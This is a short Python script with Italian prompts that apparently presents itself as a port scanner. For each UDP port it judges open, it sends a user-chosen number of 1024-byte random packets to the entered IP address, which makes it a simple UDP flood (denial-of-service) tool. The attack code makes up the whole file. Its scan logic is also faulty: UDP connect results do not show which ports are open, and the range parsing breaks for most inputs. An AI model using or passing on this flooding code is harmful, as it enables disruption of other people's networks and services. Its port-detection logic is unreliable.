import socket as so
import random


def PIDmaker(maxlenght=1024):
    PIDlenght = maxlenght
    PID = bytes ([random.getrandbits(8) for _ in range (PIDlenght)])
    return PID

target = (input("\nInserisci l'indirizzo IP da scansionare: \n"))
port = (input("Inserisci range porta (es 0-800): \n"))

lowport = 0
highport = 800

if port.find("-") == 1:
    lowport = int(port.split("-")[0])
    highport = int(port.split("-")[1])

closedPort = []
for port in range (lowport, highport+1):

    s = so.socket(so.AF_INET, so.SOCK_DGRAM)
    status = s.connect_ex ((target, port))

    if(status == 0): 
        print(f"\n*** Porta {port} Aperta ***\n")
        PIDnumber = int(input("Inserisci il numero di pacchetti UDP da inviare: \n"))
        for _ in range (PIDnumber):
            s.sendto(PIDmaker(maxlenght=1024), (target, port))
    else:
        closedPort.append(port)
        print("Porte chiuse: ", closedPort)
        s.close()

